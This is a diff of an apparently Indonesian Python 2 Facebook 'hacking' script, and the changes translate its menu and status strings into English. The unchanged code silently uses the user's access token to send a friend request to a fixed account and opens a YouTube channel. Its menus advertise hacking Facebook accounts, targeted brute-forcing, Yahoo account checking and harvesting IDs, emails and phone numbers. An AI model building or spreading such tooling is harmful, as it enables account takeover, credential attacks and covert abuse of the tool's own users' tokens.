@@ -95,7 +95,7 @@ def login():
                 zedd = open('login.txt', 'w')
                 zedd.write(z['access_token'])
                 zedd.close()
-                print '\n\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mLogin berhasil'
+                print '\n\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mLogin Successful'
                 requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
                 os.system('xdg-open https://youtube.com/NjankSoekamti')
                 time.sleep(2)
@@ -147,8 +147,8 @@ def menu():
     print '\x1b[1;97m\xe2\x95\x94' + 40 * '\xe2\x95\x90'
     print '\xe2\x95\x91\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m]\x1b[1;97m Nama \x1b[1;91m: \x1b[1;92m' + nama
     print '\x1b[1;97m\xe2\x95\x9a' + 40 * '\xe2\x95\x90'
-    print '\x1b[1;37;40m1. Informasi Pengguna'
-    print '\x1b[1;37;40m2. Hack Akun Facebook'
+    print '\x1b[1;37;40m1. Information About Facebook Freind'
+    print '\x1b[1;37;40m2. Hack Facebook Accounts'
     print '\x1b[1;37;40m3. Bot               '
     print '\x1b[1;37;40m4. Lainnya....       '
     print '\x1b[1;37;40m5. LogOut            '
@@ -200,8 +200,8 @@ def informasi():
     os.system('clear')
     print logo
     print 40 * '\x1b[1;97m\xe2\x95\x90'
-    id = raw_input('\x1b[1;91m[+] \x1b[1;92mMasukan ID\x1b[1;97m/\x1b[1;92mNama\x1b[1;91m : \x1b[1;97m')
-    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar \x1b[1;97m...')
+    id = raw_input('\x1b[1;91m[+] \x1b[1;92mAccount Link\x1b[1;97m/\x1b[1;92mName\x1b[1;91m : \x1b[1;97m')
+    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mLoading Information \x1b[1;97m...')
     r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
     cok = json.loads(r.text)
     for p in cok['data']:
@@ -253,8 +253,8 @@ def informasi():
             raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
             menu()
     else:
-        print '\x1b[1;91m[\xe2\x9c\x96] Pengguna tidak ditemukan'
-        raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+        print '\x1b[1;91m[\xe2\x9c\x96] The Information Was Hidden By Owner'
+        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
         menu()
 
 
@@ -277,7 +277,7 @@ def menu_hack():
     print '\x1b[1;37;40m4. BruteForce(\x1b[1;92mTarget\x1b[1;97m)'
     print '\x1b[1;37;40m5. Yahoo Checker'
     print '\x1b[1;37;40m6. Ambil id/email/hp'
-    print '\x1b[1;31;40m0. Kembali'
+    print '\x1b[1;31;40m0. Back'
     print
     hack_pilih()
 
